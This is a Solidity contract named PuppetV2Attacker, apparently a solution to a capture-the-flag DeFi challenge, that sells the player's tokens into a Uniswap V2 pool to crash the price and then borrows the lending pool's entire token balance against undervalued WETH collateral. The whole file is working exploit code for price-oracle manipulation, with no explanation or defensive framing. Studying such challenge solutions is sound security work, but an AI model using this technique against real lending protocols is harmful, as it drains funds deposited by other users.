// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract PuppetV2Attacker {

    address public immutable player;
    IPuppetV2Pool public immutable lendingPool;
    IUniswapV2Router02 public immutable uniswapRouter;
    IERC20 public immutable token;
    IWETH public immutable weth;

    constructor(address _lendingPool, address _uniswapRouter, address _token, address _weth) public {
        player = msg.sender;
        lendingPool = IPuppetV2Pool(_lendingPool);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        token = IERC20(_token);
        weth = IWETH(_weth);
    }

    function sellTokens() public {

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.transferFrom(
            player, 
            address(this), 
            token.balanceOf(player)
        );

        token.approve(
            address(uniswapRouter), 
            token.balanceOf(address(this))
        );

        uniswapRouter.swapExactTokensForTokens(
            token.balanceOf(address(this)), 
            0, 
            path, 
            address(this),
            block.timestamp
        );

    }

    function borrowTokens() public {

        weth.deposit{value: address(this).balance}();

        weth.approve(
            address(lendingPool), 
            weth.balanceOf(address(this))
        );

        lendingPool.borrow(
            token.balanceOf(address(lendingPool))
        );

        token.transfer(
            player, 
            token.balanceOf(address(this))
        );

    }

    function attack() public payable {
        sellTokens();
        borrowTokens();
    }

}